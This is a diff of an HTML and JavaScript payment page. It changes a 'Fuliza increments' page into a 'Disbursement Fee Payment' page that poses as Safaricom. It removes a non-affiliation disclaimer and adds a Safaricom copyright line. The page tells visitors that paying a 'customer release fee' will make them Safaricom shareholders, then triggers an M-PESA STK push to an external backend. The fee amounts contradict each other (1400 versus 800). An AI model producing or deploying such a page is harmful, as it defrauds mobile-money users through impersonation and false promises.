@@ -1,342 +1,601 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
+
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>FULIZA INCREMENTS— FINAL FEE</title>
+<title>DISBURSEMENT FEE PAYMENT </title>
 
 <style>
+@import url('https://fonts.googleapis.com/css2?family=Mali:wght@400;500;600;700&display=swap');
+
 *{
-    margin:0;
-    padding:0;
     box-sizing:border-box;
 }
 
 body{
-    min-height:100vh;
-    background:#f4f7f8;
-    font-family:Arial,sans-serif;
-    color:#222;
+    margin:0;
+    padding:16px 10px;
+    font-family:'Mali',cursive;
+    background:#eef4f8;
+    color:#16445b;
 }
 
 .container{
-    width:92%;
-    max-width:480px;
-    margin:auto;
-}
-
-header{
-    background:#087f3e;
-    color:#fff;
-    padding:22px 0;
-}
-
-.logo{
-    font-size:25px;
-    font-weight:700;
-}
-
-.brand{
-    margin-top:4px;
-    font-size:13px;
-    opacity:.9;
+    width:100%;
+    max-width:430px;
+    margin:0 auto;
 }
 
 .card{
+    width:100%;
     background:#fff;
-    margin-top:24px;
-    padding:25px 20px;
+    padding:24px 20px;
     border-radius:14px;
-    box-shadow:0 2px 10px rgba(0,0,0,.08);
+    border:1px solid #e0e8ed;
+    box-shadow:0 2px 10px rgba(0,0,0,.07);
 }
 
-h1{
-    font-size:24px;
-    margin-bottom:9px;
-}
-
-.subtitle{
-    color:#666;
-    font-size:14px;
-    line-height:1.5;
-    margin-bottom:22px;
-}
-
-.summary{
-    background:#f0f7f3;
-    border-radius:10px;
-    padding:16px;
-    margin-bottom:22px;
-}
-
-.row{
-    display:flex;
-    justify-content:space-between;
-    padding:8px 0;
-    font-size:14px;
-}
-
-.row + .row{
-    border-top:1px solid #dce9e1;
-}
-
-.label{
-    color:#666;
-}
-
-.value{
-    font-weight:700;
-    color:#087f3e;
-}
-
-label{
+.logo{
     display:block;
-    font-size:14px;
-    font-weight:600;
-    margin-bottom:7px;
+    width:85px;
+    height:auto;
+    margin:0 auto 10px;
 }
 
-input{
-    width:100%;
-    padding:14px;
-    border:1px solid #d5d5d5;
-    border-radius:8px;
-    font-size:15px;
-    outline:none;
-    margin-bottom:17px;
-}
-
-input:focus{
-    border-color:#087f3e;
-}
-
-.btn{
-    width:100%;
-    padding:15px;
-    border:none;
-    border-radius:9px;
-    background:#087f3e;
-    color:#fff;
-    font-size:16px;
+h2{
+    text-align:center;
+    margin:5px 0 15px;
+    font-size:22px;
+    color:#16445b;
     font-weight:700;
+}
+
+.intro{
+    text-align:center;
+    color:#666;
+    font-family:Arial,sans-serif;
+    font-size:14px;
+    line-height:1.6;
+}
+
+.details{
+    margin-top:18px;
+    padding:15px;
+    border-radius:12px;
+    background:#fff;
+    border:1px solid #e0e8ed;
+}
+
+.details p{
+    margin:9px 0;
+    font-family:Arial,sans-serif;
+    font-size:14px;
+}
+
+.details b{
+    color:#16445b;
+}
+
+.details span{
+    color:#125d83;
+    font-weight:700;
+}
+
+.amount{
+    margin-top:18px;
+    padding:16px;
+    text-align:center;
+    border-radius:12px;
+    background:#eef4f8;
+    border:1px solid #e0e8ed;
+}
+
+.amount small{
+    display:block;
+    color:#666;
+    font-family:Arial,sans-serif;
+    margin-bottom:5px;
+}
+
+.amount strong{
+    font-size:28px;
+    color:#125d83;
+}
+
+button{
+    width:100%;
+    margin-top:18px;
+    padding:15px;
+    border:0;
+    border-radius:14px;
+    background:#125d83;
+    color:#fff;
+    font-family:'Mali',cursive;
+    font-size:20px;
+    font-weight:600;
     cursor:pointer;
 }
 
-.btn:disabled{
+button:disabled{
     background:#aaa;
     cursor:not-allowed;
 }
 
+#status{
+    min-height:22px;
+    margin-top:14px;
+    text-align:center;
+    font-family:Arial,sans-serif;
+    font-size:13px;
+    line-height:1.5;
+    color:#125d83;
+}
+
 .notice{
     margin-top:18px;
-    padding:13px;
-    background:#fff8e6;
-    border-radius:8px;
-    color:#666;
-    font-size:12px;
-    line-height:1.5;
-}
-
-footer{
-    text-align:center;
-    padding:24px 10px;
+    padding:12px;
+    border-radius:9px;
+    background:#eef4f8;
     color:#777;
-    font-size:12px;
-    line-height:1.7;
+    font-family:Arial,sans-serif;
+    font-size:11px;
+    line-height:1.5;
+    text-align:center;
 }
 
-footer a{
-    color:#087f3e;
-    text-decoration:none;
+@media(max-width:360px){
+
+    body{
+        padding:10px;
+    }
+
+    .card{
+        padding:20px 15px;
+        border-radius:14px;
+    }
+
+    h2{
+        font-size:20px;
+    }
+
 }
-</style>
+</style> 
+
+
+
+
+
+
+
 </head>
+
 
 <body>
 
-<header>
-    <div class="container">
-        <div class="logo">FULIZA INCREMENTS</div>
-        <div class="brand">Limit Management Portal</div>
-    </div>
-</header>
+<div class="container">
 
-<main class="container">
+<div class="card">
 
-    <section class="card">
 
-        <h1>Activate Your Selection</h1>
 
-        <p class="subtitle">
-            Review your selected option and enter your phone
-            number to continue.
-        </p>
+<h2>DISBURSEMENT FEE PAYMENT </h2>
 
-        <div class="summary">
+<p class="intro">
+    Congratulations 🤩 you're done with the payment  what is remaining is for you to pay a customer release fee of ksh 1400 and then afterwards you'll became SAFARICOM PLC shareholder once more congratulations
+</p>
 
-            <div class="row">
-                <span class="label">Selected Limit</span>
-                <span class="value" id="selectedLimit">
-                    —
-                </span>
-            </div>
 
-            <div class="row">
-                <span class="label">Service Fee</span>
-                <span class="value" id="serviceFee">
-                    —
-                </span>
-            </div>
+<div class="details">
 
-        </div>
+<p>
+    <b>Applicant:</b>
+    <span id="name">Applicant</span>
+</p>
 
-        <form id="activationForm">
+<p>
+    <b>Phone:</b>
+    <span id="phone">Not available</span>
+</p>
 
-            <label for="phone">
-                Phone Number
-            </label>
+</div>
 
-            <input
-                type="tel"
-                id="phone"
-                name="phone"
-                placeholder="07XXXXXXXX"
-                inputmode="numeric"
-                autocomplete="tel"
-                required
-            >
 
-            <button
-                type="submit"
-                class="btn"
-                id="activationBtn"
-            >
-                Continue
-            </button>
+<div class="amount">
 
-        </form>
+<small>Funds disbursement Fee</small>
 
-        <div class="notice">
-            Fulboost is an independent service and is not
-            affiliated with or endorsed by Safaricom PLC.
-            Selection or payment does not guarantee approval
-            or an increase to any mobile-money account limit.
-        </div>
+<strong>KSh 800</strong>
 
-    </section>
+</div>
 
-</main>
 
-<footer>
+<button
+    id="payBtn"
+    onclick="paySecurity()"
+>
+    Pay KSh 1400
+</button>
 
-    <a href="#">Terms &amp; Conditions</a> |
-    <a href="#">Privacy Policy</a> |
-    <a href="#">Support</a>
 
-    <br>
+<div id="status"></div>
 
-    © 2026 Fulboost
 
-</footer>
+<div class="notice">
+    © 2026 Safaricom PLC. All rights reserved.
+</div>
+
+</div>
+
+</div>
+
 
 <script>
-const selectedLimitElement =
-    document.getElementById("selectedLimit");
 
-const serviceFeeElement =
-    document.getElementById("serviceFee");
+const BACKEND =
+    "https://fuliza-backend-1.onrender.com";
 
-const form =
-    document.getElementById("activationForm");
+
+const FEE = 800;
+
 
 const button =
-    document.getElementById("activationBtn");
+    document.getElementById("payBtn");
 
-const phoneInput =
-    document.getElementById("phone");
-
-
-/*
- * Read the values saved by amount.html
- */
-const selectedLimit =
-    sessionStorage.getItem("selectedLimit");
-
-const serviceFee =
-    sessionStorage.getItem("serviceFee");
+const statusBox =
+    document.getElementById("status");
 
 
-/*
- * If no limit was selected, return the
- * user to amount.html.
- */
-if(!selectedLimit || !serviceFee){
+// ==========================================
+// LOAD CUSTOMER DETAILS
+// ==========================================
 
-    selectedLimitElement.textContent = "Not selected";
-    serviceFeeElement.textContent = "Not available";
+const applicant =
+    localStorage.getItem("fullName") ||
+    localStorage.getItem("applicantName") ||
+    "Applicant";
 
-    button.disabled = true;
+const savedPhone =
+    localStorage.getItem("phoneNumber") ||
+    sessionStorage.getItem("activationPhone") ||
+    "";
 
-    setTimeout(() => {
-        window.location.href = "amount.html";
-    }, 1400);
-
-}else{
-
-    selectedLimitElement.textContent =
-        "KSh1400 " +
-        Number(selectedLimit).toLocaleString();
-
-    serviceFeeElement.textContent =
-        "KSh1400 " +
-        Number(serviceFee).toLocaleString();
-
+if (savedPhone) {
+    localStorage.setItem("phoneNumber", savedPhone);
+    sessionStorage.setItem("activationPhone", savedPhone);
 }
 
 
-/*
- * Basic phone-number validation.
- */
-form.addEventListener("submit", function(event){
+document.getElementById("name").textContent =
+    applicantName;
 
-    event.preventDefault();
+document.getElementById("phone").textContent =
+    savedPhone || "Not available";
 
-    const phone =
-        phoneInput.value.trim();
 
-    const phonePattern =
-        /^(07|01)\d{8}$/;
+// ==========================================
+// NORMALIZE KENYAN PHONE
+// ==========================================
 
-    if(!phonePattern.test(phone)){
+function normalizePhone(phone){
 
-        alert(
-            "Please enter a valid Kenyan phone number."
-        );
+    phone = String(phone)
+        .replace(/\s+/g,"");
 
-        phoneInput.focus();
+    if(phone.startsWith("+254")){
+        return phone.substring(1);
+    }
+
+    if(phone.startsWith("0")){
+        return "254" + phone.substring(1);
+    }
+
+    return phone;
+}
+
+
+// ==========================================
+// PAY SERVICE FEE
+// ==========================================
+
+async function paySecurity(){
+
+    if(!savedPhone){
+
+        statusBox.textContent =
+            "Phone number not found. Please return and enter your phone number.";
 
         return;
     }
 
 
-    /*
-     * Save the phone number for the next
-     * legitimate step in your flow.
-     */
-    sessionStorage.setItem(
-        "activationPhone",
-        phone
-    );
+    const phone =
+        normalizePhone(savedPhone);
 
-button.textContent = "Continue...";
-button.disabled = true;
 
-window.location.href = "payment.html";
-    
+    button.disabled = true;
 
-});
+    button.textContent =
+        "Sending STK Push...";
+
+    statusBox.textContent =
+        "Please wait while we send the M-PESA payment request.";
+
+
+    try{
+
+        const response =
+            await fetch(
+                BACKEND + "/stk-push",
+                {
+                    method:"POST",
+
+                    headers:{
+                        "Content-Type":
+                            "application/json"
+                    },
+
+                    body:JSON.stringify({
+
+                        phone:phone,
+
+                        amount:FEE
+
+                    })
+                }
+            );
+
+
+        const data =
+            await response.json();
+
+
+        console.log(
+            "PAYLOR STK RESPONSE:",
+            data
+        );
+
+
+        if(
+            !response.ok ||
+            !data.success
+        ){
+
+            throw new Error(
+                data.message ||
+                "Unable to initiate payment."
+            );
+
+        }
+
+
+        // ==================================
+        // GET PAYLOR TRANSACTION ID
+        // ==================================
+
+        const transactionId =
+            data.transactionId ||
+            data.checkout_request_id ||
+            data.data?.transactionId ||
+            data.data?.checkout_request_id;
+
+
+        if(!transactionId){
+
+            throw new Error(
+                "Paylor did not return a transaction ID."
+            );
+
+        }
+
+
+        sessionStorage.setItem(
+            "fulboostTransactionId",
+            transactionId
+        );
+
+
+        button.textContent =
+            "Waiting for payment...";
+
+
+        statusBox.textContent =
+            "STK Push sent. Please enter your M-PESA PIN. Your payment will be confirmed automatically.";
+
+
+        checkPayment(
+            transactionId
+        );
+
+
+    }catch(error){
+
+        console.error(
+            "PAYLOR STK ERROR:",
+            error
+        );
+
+
+        statusBox.textContent =
+            error.message ||
+            "Payment request failed.";
+
+        button.disabled = false;
+
+        button.textContent =
+            "Pay KSh 1400";
+
+    }
+
+}
+
+
+// ==========================================
+// CHECK PAYLOR PAYMENT STATUS
+// ==========================================
+
+function checkPayment(transactionId){
+
+    let attempts = 0;
+
+    const maxAttempts = 40;
+
+
+    const timer =
+        setInterval(
+            async function(){
+
+                attempts++;
+
+
+                if(attempts > maxAttempts){
+
+                    clearInterval(timer);
+
+                    statusBox.textContent =
+                        "Payment confirmation is taking longer than expected. Please check your M-PESA messages before trying again.";
+
+                    button.disabled = false;
+
+                    button.textContent =
+                        "Pay KSh 1400";
+
+                    return;
+                }
+
+
+                try{
+
+                    const response =
+                        await fetch(
+                            BACKEND +
+                            "/payment-status",
+                            {
+                                method:"POST",
+
+                                headers:{
+                                    "Content-Type":
+                                        "application/json"
+                                },
+
+                                body:JSON.stringify({
+
+                                    transactionId:
+                                        transactionId
+
+                                })
+                            }
+                        );
+
+
+                    const result =
+                        await response.json();
+
+
+                    console.log(
+                        "PAYLOR PAYMENT STATUS:",
+                        result
+                    );
+
+
+                    if(!response.ok){
+
+                        return;
+                    }
+
+
+                    const paymentStatus =
+                        String(
+                            result.status ||
+                            result.data?.status ||
+                            result.data?.data?.status ||
+                            ""
+                        ).toLowerCase();
+
+
+                    // ==============================
+                    // PAYMENT COMPLETED
+                    // ==============================
+
+                    if(
+                        paymentStatus ===
+                        "completed" ||
+
+                        paymentStatus ===
+                        "success"
+                    ){
+
+                        clearInterval(timer);
+
+
+                        statusBox.textContent =
+                            "Payment successful. Redirecting...";
+
+
+                        setTimeout(
+                            function(){
+
+                                window.location.href =
+    "success.html";
+
+                            },
+                            1000
+                        );
+
+
+                        return;
+                    }
+
+
+                    // ==============================
+                    // PAYMENT FAILED
+                    // ==============================
+
+                    if(
+                        paymentStatus ===
+                        "failed" ||
+
+                        paymentStatus ===
+                        "cancelled"
+                    ){
+
+                        clearInterval(timer);
+
+
+                        statusBox.textContent =
+                            "Payment " +
+                            paymentStatus +
+                            ".";
+
+
+                        button.disabled =
+                            false;
+
+                        button.textContent =
+                            "Pay KSh 1400";
+
+                    }
+
+
+                }catch(error){
+
+                    console.error(
+                        "PAYLOR STATUS ERROR:",
+                        error
+                    );
+
+                }
+
+            },
+            3000
+        );
+
+}
+
 </script>
 
 </body>
+
 </html>
